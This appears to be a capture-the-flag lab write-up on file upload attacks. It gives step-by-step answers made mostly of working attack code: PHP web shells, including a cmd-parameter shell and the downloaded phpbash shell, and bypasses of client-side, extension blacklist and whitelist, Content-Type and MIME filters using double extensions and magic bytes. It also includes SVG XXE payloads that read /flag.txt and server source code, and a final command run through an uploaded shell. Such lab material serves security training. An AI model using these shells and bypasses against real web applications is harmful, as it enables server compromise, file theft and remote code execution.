# File Upload Attacks
---

## Question

**Try to upload a PHP script that executes the (hostname) command on the back-end server, and submit the first word of it as the answer.**

### Answer

**Create PHP file**

```bash
# Create a PHP file that executes the hostname command
echo "<?php system('hostname'); ?>" > host.php
```

**Upload**

* Upload `host.php` via the file upload feature

**Execute**

```
http://SERVER_IP:PORT/uploads/host.php
```

**Result**

* First word of the hostname is displayed → **flag**

---

## Question

**Try to exploit the upload feature to upload a web shell and get the content of /flag.txt**

### Answer

**Download web shell**

```bash
# Download phpbash web shell
wget https://github.com/Arrexel/phpbash/blob/master/phpbash.php
```

**Upload**

* Upload `phpbash.php`

**Access shell**

```
http://SERVER_IP:PORT/uploads/phpbash.php
```

**Read flag**

```bash
# List files
ls

# Read flag
cat /flag.txt
```

---

## Question

**Try to bypass the client-side file type validations in the above exercise, then upload a web shell to read /flag.txt (try both bypass methods for better practice)**

### Answer

**Original HTML validation**

```html
onsubmit="if(validate()){upload()}"
accept=".jpg,.jpeg,.png"
```

**Modified (Client-side bypass)**

```html
onsubmit="upload()"
accept=".jpg,.jpeg,.png,.php"
```

**Upload**

* Upload `phpbash.php`

**Access**

```
http://SERVER_IP:PORT/profile_images/phpbash.php
```

**Read flag**

```bash
# Read flag file
cat /flag.txt
```

---

## Question

**Try to find an extension that is not blacklisted and can execute PHP code on the web server, and use it to read "/flag.txt"**

### Answer

**Steps**

1. Intercept upload with Burp
2. Upload any image
3. Send request to **Intruder**
4. Clear payloads

**Modify filename**

```text
filename="phpbash.phar"
```

**Replace file content**

```php
<?php echo file_get_contents('/flag.txt'); ?>
```

**Intruder payload**

```text
filename="shell$.php$"
```

**Load payload list**

```
PayloadsAllTheThings → Extension PHP → extensions.lst
```

**Identify success**

* Compare **Content-Length** with normal image upload

**Send to Repeater**

* Follow GET request
* Inspect `<img src="">` path

**Access**

```
http://SERVER_IP:PORT/profile_images/phpbash.phar
```

---

## Question

**The above exercise employs a blacklist and a whitelist test to block unwanted extensions and only allow image extensions. Try to bypass both to upload a PHP script and execute code to read "/flag.txt"**

### Answer

**Intercept upload**

* Send to Intruder

**Modify filename**

```text
filename="shell$.phtml$.jpg"
```

**Payload source**

```
PayloadsAllTheThings → PHP Extensions
```

**Identify success**

* `.phar` returns Content-Length ≈ `230`

**Send to Repeater**

* Forward request

**Access**

```
http://SERVER_IP:PORT/profile_images/shell.phar.jpg
```

---

## Question

**The above server employs Client-Side, Blacklist, Whitelist, Content-Type, and MIME-Type filters to ensure the uploaded file is an image. Try to combine all of the attacks you learned so far to bypass these filters and upload a PHP file and read the flag at "/flag.txt"**

### Answer

**Repeater modifications**

```text
filename="shell.jpg.phtml"
Content-Type: image/jpeg
```

**Magic bytes + payload**

```php
GIF8<?php echo file_get_contents('/flag.txt'); ?>
```

**Access**

```
http://SERVER_IP:PORT/profile_images/shell.jpg.phtml
```

---

## Question

**The above exercise contains an upload functionality that should be secure against arbitrary file uploads. Try to exploit it using one of the attacks shown in this section to read "/flag.txt"**

### Answer

✔️ **Solved using SVG + XXE injection** (see next questions)

---

## Question

**Try to read the source code of 'upload.php' to identify the uploads directory, and use its name as the answer. (write it exactly as found in the source, without quotes)**

### Answer (XXE – Read `/flag.txt`)

**Create SVG**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///flag.txt">
]>
<svg>&xxe;</svg>
```

**Upload**

* Upload SVG file

**View source**

* Flag displayed

---

## Question

**Try to read the source code of 'upload.php' to identify the uploads directory, and use its name as the answer. (write it exactly as found in the source, without quotes)**

### Answer (XXE – Read `upload.php`)

**SVG payload**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php">
]>
<svg>&xxe;</svg>
```

**Upload**

* View page source

**Decode**

```bash
# Decode Base64 output using CyberChef
```

**Result**

* Upload directory revealed → **answer**

---

## Question

**visit website > go to contact us > Remove client side html checks checkfile(this) and .jpg,.jpeg,.png to JavaScript source code call > upload any photo > preparing for filter invasion > used burp intruder > PayloadsAllTheThings > filename="shell$.php$.jpg content-type: image/jpeg > too bypass mime filter add ff d8 ff e0 but go to cyberchef then from hex > add at the content before payload <?php echo system($_GET["cmd"]);?> > found success shell.phar.jpeg > send to repeater**

### Answer

**Steps Summary**

1. Remove client-side validation
2. Upload any image
3. Send request to Intruder
4. Modify filename

```text
filename="shell$.php$.jpg"
```

5. Modify Content-Type

```text
Content-Type: image/jpeg
```

6. Add JPEG magic bytes

```text
FF D8 FF E0 → From  HEX (CyberChef) → ÿØÿà
```

7. Append payload

```php
<?php echo system($_GET["cmd"]); ?>
```

**Result**

* Working shell: `shell.phar.jpeg`

---

## SVG XML Upload (Advanced XXE + RCE)

### Answer

**Request**

```http
Content-Type: image/svg+xml
filename="HTB.svg"
```

**Payload**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/contact/upload.php">
]>
<svg>&xxe;</svg>
```

**Decode response**

* Upload directory discovered:

```
./user_feedback_submissions/
```

**File naming logic [current date]**

```text
YearMonthDate_shell.phar.jpeg
```

**Final exploitation**

```bash
# Execute command to locate flag
http://SERVER_IP:PORT/contact/user_feedback_submissions/YMD_shell.phar.jpeg?cmd=find+/+-name+"flag*"
```

**Result**

* Flag found ✅

---